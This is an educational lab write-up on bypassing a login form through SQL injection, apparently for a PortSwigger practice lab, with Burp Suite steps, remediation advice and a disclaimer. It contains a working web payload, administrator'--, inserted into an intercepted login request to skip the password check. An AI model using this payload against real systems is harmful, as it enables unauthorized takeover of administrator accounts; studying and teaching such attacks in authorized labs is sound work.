# 🔓 SQL Injection Vulnerability Allowing Login Bypass

## 1. 📋 Lab Overview
**Title:** SQL injection vulnerability allowing login bypass  
**Objective:** Exploit a SQL injection vulnerability in the login function to authenticate as the `administrator` user without knowing the password.  
**Vulnerability Type:** Authentication Bypass via SQL Injection (In-band, comment truncation)  
**Impact:** 🚨 Full administrative account compromise.

## 2. 🖥️ Application Behavior
The login form sends user-supplied credentials to the server via a POST request. The backend likely executes a SQL query similar to:

```sql
SELECT * FROM users 
WHERE username = '<USER_INPUT>' AND password = '<USER_INPUT>';
```

- The application does not sanitize the `username` field before embedding it into the SQL query.
- This allows an attacker to inject SQL syntax to alter the query logic.

## 3. 🛠️ Tools Used
- **Burp Suite** (Proxy & Repeater) for intercepting and modifying HTTP requests.

## 4. 🚀 Exploitation Steps

### Step 1: 🔍 Intercept the Login Request
1. Open Burp Suite and enable the Proxy.
2. Launch the lab and click **My Account**.
3. Enter arbitrary credentials (e.g., `username=abc`, `password=abc`) and click **Login**.
4. Burp Suite intercepts the request:
   ```http
   POST /login HTTP/2
   Host: <lab-domain>
   ...
   csrf=3TMhkTfhmhRVicHCqyV64Pv4tnEtlvHh&username=abc&password=abc
   ```

### Step 2: 🧪 Craft the Injection Payload
- Modify the `username` parameter to:
   ```
   administrator'--abc
   ```
- Updated request:
   ```http
   POST /login HTTP/2
   Host: <lab-domain>
   ...
   csrf=3TMhkTfhmhRVicHCqyV64Pv4tnEtlvHh&username=administrator'--abc&password=abc
   ```

**Explanation:**
- `'` closes the original string literal for the username.
- `--` starts a SQL comment, causing the rest of the query (including the password check) to be ignored.
- This effectively turns the query into:
   ```sql
   SELECT * FROM users WHERE username = 'administrator'--' AND password = 'abc';
   ```
  The password condition is never evaluated.

### Step 3: 📡 Forward the Request
- Forward the modified request in Burp Suite.
- The server responds with:
   ```http
   GET /my-account?id=administrator HTTP/2
   ```
- Forward this request as well.

### Step 4: 🎯 Result
- You are now logged in as the **administrator** user.
- **Lab Status:** ✔️ Solved.

## 5. 🧐 Root Cause Analysis
- **Cause:** Direct concatenation of unsanitized user input into SQL queries.
- **Risk:** Allows attackers to bypass authentication and gain full control over the application.

## 6. 🔐 Remediation Recommendations
- Use **prepared statements** or **parameterized queries** to prevent SQL injection.
- Apply **server-side input validation** and escaping.
- Implement **least privilege** for database accounts to limit damage from exploitation.
- Avoid revealing detailed error messages that could aid attackers.

## 7. 💡 Key Takeaways
- SQL comment syntax (`--`) is a powerful tool for bypassing query conditions.
- Authentication bypass via SQLi can be achieved without brute-forcing passwords.
- Always validate and sanitize user input before using it in database queries.

## ⚠️ Disclaimer
This write-up is provided **for educational purposes only**. The techniques described here must **only** be used in authorized environments such as PortSwigger’s labs or systems you have explicit permission to test.  
Unauthorized testing or exploitation of systems is **illegal** and may result in severe legal consequences.
